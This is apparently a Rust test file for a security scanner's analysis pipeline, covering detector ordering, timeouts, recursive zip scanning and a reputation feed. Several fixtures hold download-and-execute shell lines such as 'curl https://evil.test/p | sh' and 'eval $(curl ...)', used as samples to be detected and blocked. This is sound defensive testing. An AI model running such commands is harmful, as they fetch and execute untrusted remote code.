use super::{
    AnalysisContext, AnalysisCoordinator, Detector, DetectorError, DetectorStatus,
    ReputationDetector, RetrievalInfo, analyze_recursive, digest, issue_to_finding,
};
use arbitraitor_archive::{ArchiveError, ArtifactOrigin, PayloadIssue};
use arbitraitor_artifact::ArtifactType;
use arbitraitor_intel::{
    CURRENT_SCHEMA_VERSION, Classification, Disposition, FeedEntry, FeedEvidence, FeedSource,
    FeedSourceClass, Indicator, IndicatorType, IntelStore, ReviewState, ReviewStatus,
};
use arbitraitor_model::artifact::ArtifactKind;
use arbitraitor_model::finding::{DetectorMetadata, Evidence, Finding, FindingCategory};
use arbitraitor_model::ids::Sha256Digest;
use arbitraitor_model::verdict::{Confidence, Severity, Verdict};
use std::fs;
use std::io::{Cursor, Write};
use std::path::PathBuf;
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use zip::ZipWriter;
use zip::write::SimpleFileOptions;

#[test]
fn default_pipeline_detects_shell_download_to_execute() {
    let coordinator = AnalysisCoordinator::new();
    let result = coordinator.analyze(b"#!/bin/sh\ncurl https://example.test/install.sh | sh\n");

    assert!(matches!(
        result.classification.artifact_type,
        ArtifactType::ShellScript(_)
    ));
    assert!(
        result
            .findings
            .iter()
            .any(|finding| finding.tags.iter().any(|tag| tag == "download-to-execute"))
    );
    assert_eq!(result.verdict, Verdict::Block);
    assert_eq!(result.detector_results.len(), 2);
    assert!(
        result
            .detector_results
            .iter()
            .all(|result| matches!(result.status, DetectorStatus::Ok))
    );
}

#[test]
fn coordinator_runs_custom_detectors_in_detector_id_order() {
    let coordinator = AnalysisCoordinator::with_detectors(vec![
        Box::new(RecordingDetector::new("z.detector")),
        Box::new(RecordingDetector::new("a.detector")),
    ]);

    let result = coordinator.analyze(b"plain text\n");

    let detector_ids: Vec<&str> = result
        .detector_results
        .iter()
        .map(|detector_result| detector_result.metadata.id.as_str())
        .collect();
    assert_eq!(detector_ids, vec!["a.detector", "z.detector"]);
    let finding_detectors: Vec<&str> = result
        .findings
        .iter()
        .map(|finding| finding.detector.as_str())
        .collect();
    assert_eq!(finding_detectors, vec!["a.detector", "z.detector"]);
}

#[test]
#[cfg(not(windows))]
fn detector_failure_is_recorded_and_verdict_is_incomplete() {
    let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(FailingDetector)]);

    let result = coordinator.analyze(b"not empty");

    assert!(result.findings.is_empty());
    assert_eq!(result.verdict, Verdict::Incomplete);
    assert_eq!(result.detector_results.len(), 1);
    assert!(matches!(
        result.detector_results[0].status,
        DetectorStatus::Error(_)
    ));
}

#[test]
fn detector_completing_within_timeout_is_ok() {
    let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(SlowDetector {
        id: "prompt.detector",
        sleep_ms: 1,
        timeout_ms: 100,
    })]);

    let result = coordinator.analyze(b"not empty");

    assert_eq!(result.findings.len(), 1);
    assert_eq!(result.detector_results.len(), 1);
    assert!(matches!(
        result.detector_results[0].status,
        DetectorStatus::Ok
    ));
}

#[test]
fn slow_detector_timeout_is_recorded_and_verdict_is_incomplete() {
    let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(SlowDetector {
        id: "timeout.detector",
        sleep_ms: 100,
        timeout_ms: 5,
    })]);

    let result = coordinator.analyze(b"not empty");

    assert!(result.findings.is_empty());
    assert_eq!(result.verdict, Verdict::Incomplete);
    assert_eq!(result.detector_results.len(), 1);
    assert!(matches!(
        result.detector_results[0].status,
        DetectorStatus::Timeout
    ));
}

#[test]
fn timed_out_detector_does_not_prevent_others_from_running() {
    let coordinator = AnalysisCoordinator::with_detectors(vec![
        Box::new(SlowDetector {
            id: "a.timeout.detector",
            sleep_ms: 100,
            timeout_ms: 5,
        }),
        Box::new(RecordingDetector::new("b.survivor.detector")),
    ]);

    let result = coordinator.analyze(b"not empty");

    assert_eq!(result.detector_results.len(), 2);
    assert!(matches!(
        result.detector_results[0].status,
        DetectorStatus::Timeout
    ));
    assert!(matches!(
        result.detector_results[1].status,
        DetectorStatus::Ok
    ));
    assert!(
        result
            .findings
            .iter()
            .any(|finding| finding.detector == "b.survivor.detector")
    );
    assert_eq!(result.verdict, Verdict::Incomplete);
}

#[test]
fn retrieval_metadata_is_available_to_detectors() {
    let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(RetrievalDetector)]);
    let retrieval = RetrievalInfo {
        requested_location: Some("https://example.test/install.sh".to_owned()),
        final_location: None,
        content_type: Some("text/plain".to_owned()),
        byte_count: Some(10),
    };

    let result = coordinator.analyze_with_retrieval(b"plain text\n", Some(retrieval));

    assert_eq!(result.findings.len(), 1);
    assert_eq!(result.findings[0].title, "retrieval metadata observed");
}

#[test]
fn analyze_records_operation_metrics() -> Result<(), Box<dyn std::error::Error>> {
    let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(RecordingDetector::new(
        "metrics.detector",
    ))]);

    let result = coordinator.analyze(b"plain text\n");
    let Some(metrics) = result.metrics.as_ref() else {
        return Err("metrics should be enabled".into());
    };
    assert_eq!(metrics.finding_count, 1);
    assert_eq!(metrics.verdict, "Warn");
    assert_eq!(metrics.artifact_size, 11);
    assert_eq!(metrics.detector_count, 1);
    assert_eq!(metrics.detector_errors, 0);
    assert!(result.detector_results[0].duration_ms <= metrics.scan_duration_ms);
    Ok(())
}

#[test]
fn metrics_can_be_disabled() {
    let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(RecordingDetector::new(
        "metrics.detector",
    ))])
    .with_metrics_enabled(false);

    let result = coordinator.analyze(b"plain text\n");

    assert!(result.metrics.is_none());
}

#[test]
#[cfg(not(windows))]
fn panicking_detector_does_not_prevent_others_from_running() {
    let coordinator = AnalysisCoordinator::with_detectors(vec![
        Box::new(FailingDetector),
        Box::new(RecordingDetector::new("survivor.detector")),
    ]);

    let result = coordinator.analyze(b"not empty");

    assert_eq!(result.detector_results.len(), 2);
    assert!(matches!(
        result.detector_results[0].status,
        DetectorStatus::Error(_)
    ));
    assert!(matches!(
        result.detector_results[1].status,
        DetectorStatus::Ok
    ));
    assert!(
        result
            .findings
            .iter()
            .any(|f| f.detector == "survivor.detector")
    );
    assert_eq!(result.verdict, Verdict::Incomplete);
}

#[test]
fn all_findings_carry_correct_artifact_digest() {
    let coordinator = AnalysisCoordinator::new();
    let bytes = b"#!/bin/bash\neval $(curl https://evil.test/payload)\n";
    let expected = digest(bytes);

    let result = coordinator.analyze(bytes);

    assert!(!result.findings.is_empty());
    for finding in &result.findings {
        assert_eq!(
            finding.artifact_sha256, expected,
            "finding {} has wrong digest",
            finding.id
        );
    }
}

#[test]
fn coordinator_overwrites_wrong_digest_from_detector() {
    let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(WrongDigestDetector)]);
    let bytes = b"plain text\n";
    let expected = digest(bytes);

    let result = coordinator.analyze(bytes);

    assert_eq!(result.findings.len(), 1);
    assert_eq!(result.findings[0].artifact_sha256, expected);
}

fn recursive_zip_bytes(entries: &[(&str, &[u8])]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let cursor = Cursor::new(Vec::new());
    let mut writer = ZipWriter::new(cursor);
    for (name, data) in entries {
        writer.start_file(*name, SimpleFileOptions::default())?;
        writer.write_all(data)?;
    }
    Ok(writer.finish()?.into_inner())
}

#[test]
fn analyze_recursive_aggregates_findings_from_root_and_entries()
-> Result<(), Box<dyn std::error::Error>> {
    let coordinator = AnalysisCoordinator::new();
    let shell = b"#!/bin/sh\ncurl https://evil.test/p | sh\n";
    let shell_digest = digest(shell);
    let archive = recursive_zip_bytes(&[("install.sh", shell)])?;

    let (node, findings) = analyze_recursive(&coordinator, &archive, 4);

    assert_eq!(node.kind, ArtifactType::ZipArchive);
    assert_eq!(node.contained.len(), 1);
    assert_eq!(node.contained[0].sha256, shell_digest);

    let shell_finding = findings.iter().find(|finding| {
        finding.artifact_sha256 == shell_digest
            && finding.tags.iter().any(|tag| tag == "download-to-execute")
    });
    let shell_finding =
        shell_finding.ok_or("shell entry should produce a download-to-execute finding")?;
    assert_eq!(shell_finding.severity, Severity::Critical);
    assert!(
        shell_finding
            .tags
            .iter()
            .any(|tag| tag == "payload-origin:archive-entry"),
        "entry findings must be tagged with their payload origin"
    );
    assert!(
        shell_finding
            .tags
            .iter()
            .any(|tag| tag == "payload-entry:install.sh"),
        "entry findings must record their entry name"
    );
    assert!(
        shell_finding
            .tags
            .iter()
            .any(|tag| tag == "payload-depth:1"),
        "entry findings must record their depth"
    );
    Ok(())
}

#[test]
fn analyze_recursive_attributes_each_finding_to_its_own_node()
-> Result<(), Box<dyn std::error::Error>> {
    let coordinator = AnalysisCoordinator::new();
    let shell_a = b"#!/bin/sh\ncurl https://evil.test/a | sh\n";
    let shell_b = b"#!/bin/sh\ncurl https://evil.test/b | sh\n";
    let digest_a = digest(shell_a);
    let digest_b = digest(shell_b);
    let archive = recursive_zip_bytes(&[("a.sh", shell_a), ("b.sh", shell_b)])?;

    let (node, findings) = analyze_recursive(&coordinator, &archive, 4);

    assert_eq!(node.contained.len(), 2);
    assert!(
        findings
            .iter()
            .any(|finding| finding.artifact_sha256 == digest_a),
        "findings must include findings for entry a.sh"
    );
    assert!(
        findings
            .iter()
            .any(|finding| finding.artifact_sha256 == digest_b),
        "findings must include findings for entry b.sh"
    );
    assert_eq!(
        node.sha256,
        digest(&archive),
        "root node digest must match the archive bytes"
    );
    assert!(
        findings.iter().all(|finding| {
            finding.artifact_sha256 != node.sha256
                || finding.tags.iter().any(|tag| tag == "payload-origin:root")
        }),
        "root findings must be tagged as root origin"
    );
    Ok(())
}

#[test]
fn analyze_recursive_emits_depth_truncation_finding() -> Result<(), Box<dyn std::error::Error>> {
    let coordinator = AnalysisCoordinator::new();
    let inner = recursive_zip_bytes(&[("leaf.txt", b"plain")])?;
    let outer = recursive_zip_bytes(&[("inner.zip", &inner)])?;

    let (node, findings) = analyze_recursive(&coordinator, &outer, 1);

    assert_eq!(node.contained.len(), 1);
    assert!(
        node.contained[0].contained.is_empty(),
        "inner archive must be truncated at max_depth=1"
    );
    let truncation = findings.iter().find(|finding| {
        finding
            .tags
            .iter()
            .any(|tag| tag == "payload-depth-truncated")
    });
    let truncation = truncation.ok_or("a depth-truncation finding must be emitted")?;
    assert_eq!(truncation.severity, Severity::Medium);
    assert_eq!(truncation.category, FindingCategory::ResourceLimitEvent);
    assert_eq!(
        truncation.detector,
        "arbitraitor-analysis.recursive-payload"
    );
    assert_eq!(truncation.artifact_sha256, node.contained[0].sha256);
    Ok(())
}

#[test]
fn analyze_recursive_on_non_archive_runs_coordinator_once() {
    let coordinator = AnalysisCoordinator::new();
    let bytes = b"#!/bin/sh\ncurl https://evil.test/p | sh\n";

    let (node, findings) = analyze_recursive(&coordinator, bytes, 4);

    assert!(node.contained.is_empty());
    assert_eq!(node.origin, ArtifactOrigin::Root);
    assert_eq!(node.sha256, digest(bytes));
    assert!(!findings.is_empty(), "root shell findings must be present");
    assert!(
        findings
            .iter()
            .all(|finding| finding.tags.iter().any(|tag| tag == "payload-origin:root")),
        "all findings on a leaf root must be tagged as root origin"
    );
}

#[test]
fn issue_to_finding_maps_cycle_to_critical_archive_hazard() {
    let sha = Sha256Digest::new([0x11; 32]);
    let finding = issue_to_finding(PayloadIssue::Cycle {
        sha256: sha.clone(),
        origin: ArtifactOrigin::Root,
    });

    assert_eq!(finding.id, "recursive-payload.cycle");
    assert_eq!(finding.category, FindingCategory::ArchiveHazard);
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.artifact_sha256, sha);
    assert!(finding.tags.iter().any(|tag| tag == "payload-cycle"));
}

#[test]
fn issue_to_finding_maps_archive_error_to_medium_finding() {
    let sha = Sha256Digest::new([0x22; 32]);
    let finding = issue_to_finding(PayloadIssue::ArchiveError {
        error: ArchiveError::LimitExceeded {
            limit: "max_total_unpacked_bytes",
        },
        sha256: sha.clone(),
        origin: ArtifactOrigin::Root,
    });

    assert_eq!(finding.id, "recursive-payload.archive-error");
    assert_eq!(finding.severity, Severity::Medium);
    assert_eq!(finding.artifact_sha256, sha);
    assert!(
        finding
            .tags
            .iter()
            .any(|tag| tag == "payload-archive-error")
    );
}

#[test]
fn issue_to_finding_maps_depth_truncation_to_resource_limit_event() {
    let sha = Sha256Digest::new([0x33; 32]);
    let finding = issue_to_finding(PayloadIssue::DepthTruncated {
        sha256: sha.clone(),
        origin: ArtifactOrigin::Root,
        max_depth: 2,
    });

    assert_eq!(finding.id, "recursive-payload.depth-truncated");
    assert_eq!(finding.category, FindingCategory::ResourceLimitEvent);
    assert_eq!(finding.severity, Severity::Medium);
    assert_eq!(finding.artifact_sha256, sha);
    assert_eq!(finding.detector, "arbitraitor-analysis.recursive-payload");
}

#[test]
fn reputation_detector_reports_enterprise_sha256_block() -> Result<(), Box<dyn std::error::Error>> {
    let bytes = b"known bad payload";
    let digest = digest(bytes).to_string();
    let store = store_with_entries(
        "enterprise-sha",
        [entry(
            IndicatorType::Sha256,
            &digest,
            FeedSourceClass::EnterpriseDeny,
        )],
    )?;
    let detector = ReputationDetector::new(store);
    let ctx = test_context(bytes, None);

    let findings = detector.analyze(&ctx)?;

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].severity, Severity::Critical);
    assert_eq!(findings[0].confidence, Confidence::Confirmed);
    assert!(
        findings[0]
            .tags
            .iter()
            .any(|tag| tag == "disposition:block")
    );
    Ok(())
}

#[test]
fn reputation_detector_reports_community_url_warn() -> Result<(), Box<dyn std::error::Error>> {
    let url = "https://example.invalid/install.sh";
    let store = store_with_entries(
        "community-url",
        [entry(
            IndicatorType::ExactUrl,
            url,
            FeedSourceClass::CorroboratedCommunity,
        )],
    )?;
    let detector = ReputationDetector::new(store);
    let ctx = test_context(
        b"payload",
        Some(RetrievalInfo {
            requested_location: Some(url.to_owned()),
            final_location: None,
            content_type: None,
            byte_count: None,
        }),
    );

    let findings = detector.analyze(&ctx)?;

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].severity, Severity::Medium);
    assert!(findings[0].tags.iter().any(|tag| tag == "disposition:warn"));
    Ok(())
}

#[test]
fn reputation_detector_reports_no_findings_without_matches()
-> Result<(), Box<dyn std::error::Error>> {
    let store = store_with_entries(
        "no-match",
        [entry(
            IndicatorType::Sha256,
            &"00".repeat(32),
            FeedSourceClass::EnterpriseDeny,
        )],
    )?;
    let detector = ReputationDetector::new(store);
    let ctx = test_context(b"different payload", None);

    assert!(detector.analyze(&ctx)?.is_empty());
    Ok(())
}

#[test]
fn reputation_detector_ignores_expired_entries() -> Result<(), Box<dyn std::error::Error>> {
    let bytes = b"formerly bad payload";
    let mut expired = entry(
        IndicatorType::Sha256,
        &digest(bytes).to_string(),
        FeedSourceClass::EnterpriseDeny,
    );
    expired.expires_at = Some("1970-01-01T00:00:00Z".to_owned());
    let store = store_with_entries("expired", [expired])?;
    let detector = ReputationDetector::new(store);
    let ctx = test_context(bytes, None);

    assert!(detector.analyze(&ctx)?.is_empty());
    Ok(())
}

struct RecordingDetector {
    id: &'static str,
}

impl RecordingDetector {
    const fn new(id: &'static str) -> Self {
        Self { id }
    }
}

impl Detector for RecordingDetector {
    fn metadata(&self) -> DetectorMetadata {
        test_metadata(self.id)
    }

    fn analyze(&self, ctx: &AnalysisContext<'_>) -> Result<Vec<Finding>, DetectorError> {
        Ok(vec![test_finding(self.id, ctx, "recorded")])
    }
}

struct FailingDetector;

impl Detector for FailingDetector {
    fn metadata(&self) -> DetectorMetadata {
        test_metadata("failing.detector")
    }

    fn analyze(&self, ctx: &AnalysisContext<'_>) -> Result<Vec<Finding>, DetectorError> {
        if !ctx.artifact_bytes.is_empty() {
            return Err(DetectorError::Other("forced detector failure".to_owned()));
        }
        Ok(Vec::new())
    }
}

struct SlowDetector {
    id: &'static str,
    sleep_ms: u64,
    timeout_ms: u64,
}

impl Detector for SlowDetector {
    fn metadata(&self) -> DetectorMetadata {
        let mut metadata = test_metadata(self.id);
        metadata.default_timeout_ms = self.timeout_ms;
        metadata
    }

    fn analyze(&self, ctx: &AnalysisContext<'_>) -> Result<Vec<Finding>, DetectorError> {
        thread::sleep(Duration::from_millis(self.sleep_ms));
        Ok(vec![test_finding(self.id, ctx, "slow detector completed")])
    }
}

struct WrongDigestDetector;

impl Detector for WrongDigestDetector {
    fn metadata(&self) -> DetectorMetadata {
        test_metadata("wrong-digest.detector")
    }

    fn analyze(&self, _ctx: &AnalysisContext<'_>) -> Result<Vec<Finding>, DetectorError> {
        Ok(vec![Finding {
            id: "wrong-digest.finding".to_owned(),
            detector: "wrong-digest.detector".to_owned(),
            category: FindingCategory::SuspiciousScriptBehavior,
            severity: Severity::Low,
            confidence: Confidence::High,
            title: "wrong digest".to_owned(),
            description: "detector set wrong digest".to_owned(),
            evidence: Vec::<Evidence>::new(),
            artifact_sha256: arbitraitor_model::ids::Sha256Digest::new([0xff; 32]),
            location: None,
            remediation: None,
            references: Vec::new(),
            tags: Vec::new(),
            taxonomies: Vec::new(),
        }])
    }
}

struct RetrievalDetector;

impl Detector for RetrievalDetector {
    fn metadata(&self) -> DetectorMetadata {
        test_metadata("retrieval.detector")
    }

    fn analyze(&self, ctx: &AnalysisContext<'_>) -> Result<Vec<Finding>, DetectorError> {
        if ctx.retrieval.is_some() {
            Ok(vec![test_finding(
                "retrieval.detector",
                ctx,
                "retrieval metadata observed",
            )])
        } else {
            Ok(Vec::new())
        }
    }
}

fn test_metadata(id: &str) -> DetectorMetadata {
    DetectorMetadata {
        id: id.to_owned(),
        version: "test".to_owned(),
        supported_artifact_kinds: vec![ArtifactKind::GenericText],
        capabilities: Vec::new(),
        is_local: true,
        may_upload: false,
        default_timeout_ms: 5_000,
        is_deterministic: true,
    }
}

fn test_finding(detector: &str, ctx: &AnalysisContext<'_>, title: &str) -> Finding {
    Finding {
        id: format!("{detector}.finding"),
        detector: detector.to_owned(),
        category: FindingCategory::SuspiciousScriptBehavior,
        severity: Severity::Low,
        confidence: Confidence::High,
        title: title.to_owned(),
        description: "test finding".to_owned(),
        evidence: Vec::<Evidence>::new(),
        artifact_sha256: ctx.artifact_sha256.clone(),
        location: None,
        remediation: None,
        references: Vec::new(),
        tags: Vec::new(),
        taxonomies: Vec::new(),
    }
}

fn test_context(artifact_bytes: &[u8], retrieval: Option<RetrievalInfo>) -> AnalysisContext<'_> {
    AnalysisContext {
        artifact_bytes,
        classification: arbitraitor_artifact::classify(artifact_bytes),
        retrieval,
        artifact_sha256: digest(artifact_bytes),
    }
}

fn store_with_entries(
    name: &str,
    entries: impl IntoIterator<Item = FeedEntry>,
) -> Result<IntelStore, Box<dyn std::error::Error>> {
    let path = temp_store_path(name);
    let mut store = IntelStore::open(&path)?;
    for entry in entries {
        store.add_entry(entry)?;
    }
    let _ = fs::remove_file(path);
    Ok(store)
}

fn temp_store_path(name: &str) -> PathBuf {
    let unique = format!(
        "arbitraitor-analysis-{name}-{}-{}.json",
        std::process::id(),
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map_or(0, |duration| duration.as_nanos())
    );
    std::env::temp_dir().join(unique)
}

fn entry(indicator_type: IndicatorType, value: &str, source_class: FeedSourceClass) -> FeedEntry {
    let indicator = Indicator {
        indicator_type,
        value: value.to_owned(),
    };
    FeedEntry {
        schema_version: CURRENT_SCHEMA_VERSION,
        id: format!("entry:{indicator_type:?}:{value}"),
        indicator,
        classification: Classification::Malicious,
        severity: Severity::High,
        confidence: Confidence::Confirmed,
        disposition: Disposition::Block,
        source_class,
        first_seen: "2026-06-01T00:00:00Z".to_owned(),
        last_seen: "2026-06-17T00:00:00Z".to_owned(),
        expires_at: None,
        sources: vec![FeedSource {
            source_type: "test".to_owned(),
            reference: "analysis-test".to_owned(),
        }],
        evidence: FeedEvidence {
            malware_family: None,
            notes: None,
        },
        review: ReviewStatus {
            status: ReviewState::Reviewed,
            reviewers: vec!["test".to_owned()],
        },
    }
}
